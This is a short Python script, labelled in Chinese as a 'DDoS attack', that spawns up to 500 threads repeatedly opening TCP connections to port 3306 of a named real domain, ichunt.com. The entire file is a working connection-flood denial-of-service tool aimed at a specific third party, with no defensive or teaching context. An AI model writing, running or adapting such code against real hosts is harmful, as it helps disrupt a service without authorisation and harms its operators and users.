import socket, time
from threading import Thread, active_count

class DDos:
    """
    ddos攻击
    """
    def ddos(self, host, port):
        sock = socket.socket()
        sock.connect((host, port))

    def start(self):
        while 1:
            if active_count() <= 500:
                Thread(target=self.ddos, args=('ichunt.com', 3306)).start()
            else:
                time.sleep(2)